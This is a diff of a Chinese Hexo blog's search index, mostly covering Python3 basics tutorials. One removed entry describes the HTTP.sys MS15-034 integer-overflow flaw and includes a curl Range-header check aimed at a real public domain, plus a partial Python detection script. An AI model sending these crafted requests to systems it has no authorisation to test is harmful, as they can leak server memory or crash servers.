对文件重命名</span></span><br><span class="line">os.rename(<span class="string">&quot;文件名&quot;</span>,<span class="string">&quot;路径/文件名&quot;</span>)</span><br><span class="line"><span class="comment"># 也可以用来移动文件</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-流程控制语句</title>
+    <url>//f68e861f37cd.html</url>
+    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
+
+<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1573,171 +1758,6 @@
 </tr>
 </tbody></table>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">匹配url</span><br><span class="line"><span class="comment"># 正则的语法里面不能敲空格</span></span><br><span class="line">re.findall(<span class="string">&#x27;[a-zA-Z]&#123;4,5&#125;://\w*\.*\w+\.\w+&#x27;</span>,url)</span><br><span class="line">re.findall(<span class="string">&#x27;(https://|http://)(\w*\.*\w+\.\w+)&#x27;</span>,url)</span><br><span class="line">re.findall(<span class="string">&#x27;https://(\w*\.*\w+\.\w+)&#x27;</span>,url)</span><br><span class="line"></span><br><span class="line">匹配邮箱</span><br><span class="line">re.findall(<span class="string">&#x27;.+@\w*\.*\w+&#x27;</span>,mail)</span><br><span class="line">re.findall(<span class="string">&#x27;.+@.+&#x27;</span>,mail)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3-流程控制语句</title>
-    <url>//f68e861f37cd.html</url>
-    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
-
-<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3-文件与目录</title>
-    <url>//aeab54f73184.html</url>
-    <content><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>通过python程序对计算机中的各种文件进行增删改查等操作</p>
-<p>I/O (input/output)</p>
-<p>在windows系统使用路径时，可以使用<code>/</code>来代替 <code>\</code><br>或者可以使用 <code>\\ </code>来代替 <code>\</code><br>或者也可以使用原始字符串<code> r&#39;xxx&#39;</code><br>表示路径，可以使用<code>..</code>来返回一级目录</p>
-<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>, encoding_=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br><span class="line">参数：</span><br><span class="line">	<span class="built_in">open</span>(file) 要打开的文件的名字（路径）</span><br><span class="line">返回值：</span><br><span class="line">	返回一个对象，这个对象就代表了当前打开的文件</span><br><span class="line">    </span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line"><span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with...as 语句</span></span><br><span class="line"><span class="comment"># 通过with语句，在处理文件时，不论是否抛出异常，都可以保证关闭已经打开的文件</span></span><br><span class="line"><span class="comment"># as后跟自定义变量</span></span><br><span class="line"><span class="comment"># 在with语句中可以直接使用file_obj来做文件操作</span></span><br><span class="line"><span class="comment"># 这个文件只能在with中使用，一旦with结束则文件会自动close()</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(file.read())</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用open()来打开一个文件，可以将文件分成两种类型</span></span><br><span class="line"><span class="comment"># 一种，是纯文本文件（使用utf-8等编码编写的文本文件）</span></span><br><span class="line"><span class="comment"># 一种，是二进制文件（图片、mp3、ppt等这些文件）</span></span><br><span class="line"><span class="comment"># open()打开文件时，默认是以文本文件的形式打开的，但是open()默认的编码为None</span></span><br><span class="line"><span class="comment"># encodint可以设置指定文件的编码</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="built_in">print</span>(file.read())</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line">b = file.read()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件</span></span><br><span class="line"><span class="comment"># 如果要读取的文件较大的话，会一次性将文件的内容加载到内存中，容易导致内存泄漏</span></span><br><span class="line"><span class="comment"># 所以不能直接调用read()</span></span><br><span class="line"><span class="comment"># read()可以接收一个size作为参数，该参数用来指定要读取的字符的数量</span></span><br><span class="line"><span class="comment">#   默认值为-1，它会读取文件中的所有字符</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		content = file_obj.read(-<span class="number">1</span>)</span><br><span class="line">		content = file_obj.read(<span class="number">20</span>)</span><br><span class="line">		<span class="built_in">print</span>(content)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件方法二</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="comment"># 定义一个变量，来保存文件的内容</span></span><br><span class="line">        file_content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			content = file_obj.read(<span class="number">100</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="comment"># print(content,end=&#x27;&#x27;)</span></span><br><span class="line">			<span class="comment"># 利用拼串的方式分块读取内容</span></span><br><span class="line">			file_content += content</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file_content)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h2><p>readline() 该方法可以用来读取一行内容<br>readlines()    该方法用于一行一行读取内容，会一次性把读取到的内容封装到列表中</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pprint <span class="comment"># 当字符超过80字节时，用来美化输出</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="built_in">print</span>(file.readline(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment"># r = file.readlines()</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r)</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r[1])</span></span><br><span class="line"><span class="comment"># for循环也可以一行行读取数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="tell"><a href="#tell" class="headerlink" title="tell()"></a>tell()</h2><p><code>tell()</code>方法用来查看当前读取位置</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="seek"><a href="#seek" class="headerlink" title="seek()"></a>seek()</h2><p><code>seek()</code>用来修改当前读取的位</p>
-<p><code>seek()</code>需要两个参数，第一个是要切换到的位置，第二个是计算位置方式</p>
-<p>可选值：</p>
-<ul>
-<li>0： 从头计算，默认值</li>
-<li>1：从当前位置计算</li>
-<li>2：从最后位置开始计算</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># 使用seek(x,2)的时候，用r+可能导致报错，推荐使用rb</span></span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>)</span><br><span class="line">    <span class="comment"># 修改当前读取的位置为50字节</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 从50个字节起读取50个字节</span></span><br><span class="line">    file_obj.seek(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个之后的,会什么都读取不到</span></span><br><span class="line">    file_obj.seek(-<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个字节</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前读取的位置是:&#x27;</span>,file_obj.tell())</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><table>
-<thead>
-<tr>
-<th align="center">参数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">t</td>
-<td align="center">文本模式（默认）</td>
-</tr>
-<tr>
-<td align="center">x</td>
-<td align="center">写模式，新建文件，如果该文件存在则报错</td>
-</tr>
-<tr>
-<td align="center">b</td>
-<td align="center">二进制模式</td>
-</tr>
-<tr>
-<td align="center">+</td>
-<td align="center">打开一个文件（可读可写）</td>
-</tr>
-<tr>
-<td align="center">U</td>
-<td align="center">通用换行模式（不推荐）</td>
-</tr>
-<tr>
-<td align="center">r</td>
-<td align="center">以只读方式打开文件（默认），文件不存在则报错</td>
-</tr>
-<tr>
-<td align="center">rb</td>
-<td align="center">以只读方式打开二进制文件（默认）</td>
-</tr>
-<tr>
-<td align="center">r+</td>
-<td align="center">以读写的方式打开一个文件</td>
-</tr>
-<tr>
-<td align="center">rb+</td>
-<td align="center">以读写的方式打开一个二进制文件</td>
-</tr>
-<tr>
-<td align="center">w</td>
-<td align="center">以只写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">wb</td>
-<td align="center">以只写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">w+</td>
-<td align="center">以读写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">wb+</td>
-<td align="center">以读写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">a</td>
-<td align="center">以追加的方式写入一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">ab</td>
-<td align="center">以追加的方式写入一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">a+</td>
-<td align="center">以追加的方式读写一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">ab+</td>
-<td align="center">以追加的方式读写一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
-</tr>
-</tbody></table>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件写入</span></span><br><span class="line"><span class="comment"># 如果不指定操作类型，则默认是 读取文件 ， 而读取文件时是不能向文件中写入的</span></span><br><span class="line">name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># write()来向文件中写入内容，不会自动换行</span></span><br><span class="line">    <span class="comment"># 如果操作的是一个文本文件的话，则write()需要传递一个字符串作为参数</span></span><br><span class="line">    <span class="comment"># 该方法会可以分多次向文件中写入内容</span></span><br><span class="line">    <span class="comment"># 写入完成以后，该方法会返回写入的字符的个数</span></span><br><span class="line">	file.write(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">	r = file.write(<span class="built_in">str</span>(<span class="number">123</span>))</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p>二进制文件<br>所有文件分为文本文件和二进制文件<br>读取模式<br>t 读取文本文件（默认值）<br>b 读取二进制文件<br>读取文本文件时，size是以字符为单位的<br>读取二进制文件时，size是以字节为单位</p>
-<p>rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&quot;xxx/xxx.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line">    new_name = <span class="string">&quot;new.jpg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(new_name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> new_obj:</span><br><span class="line">        chunk = <span class="number">1024</span> * <span class="number">100</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = file_obj.read(chunk)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            new_obj.write(content)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="检查文件是否存在"><a href="#检查文件是否存在" class="headerlink" title="检查文件是否存在"></a>检查文件是否存在</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name) <span class="keyword">as</span> file_obj :</span><br><span class="line">        <span class="built_in">print</span>(file_obj.read())</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 文件不存在~~&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">path = os.listdir()</span><br><span class="line"><span class="comment"># os.listdir()获取指定目录的结构，默认获取当前路径，返回一个列表</span></span><br><span class="line">path1 = os.getcwd()</span><br><span class="line"><span class="comment"># os.getcwd()获取当前所在的路径</span></span><br><span class="line">os.chdir(<span class="string">&quot;c:\\xxx\\xxx&quot;</span>)</span><br><span class="line"><span class="comment"># os.chdir(&quot;c:\\&quot;&quot;)修改当前路径为xxx</span></span><br><span class="line">pprint.pprint(path1)</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下创建一个目录</span></span><br><span class="line">os.rmdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除一个目录</span></span><br><span class="line">os.remove(<span class="string">&quot;xxx.txt&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除文件</span></span><br><span class="line">os.rename(<span class="string">&quot;旧名字&quot;</span>,<span class="string">&quot;新名字&quot;</span>)</span><br><span class="line"><span class="comment"># 对文件重命名</span></span><br><span class="line">os.rename(<span class="string">&quot;文件名&quot;</span>,<span class="string">&quot;路径/文件名&quot;</span>)</span><br><span class="line"><span class="comment"># 也可以用来移动文件</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -2307,44 +2327,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
-    <url>//67bda6fdaf83.html</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
-<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
-<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器打上了补丁，那么响应状态应该是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        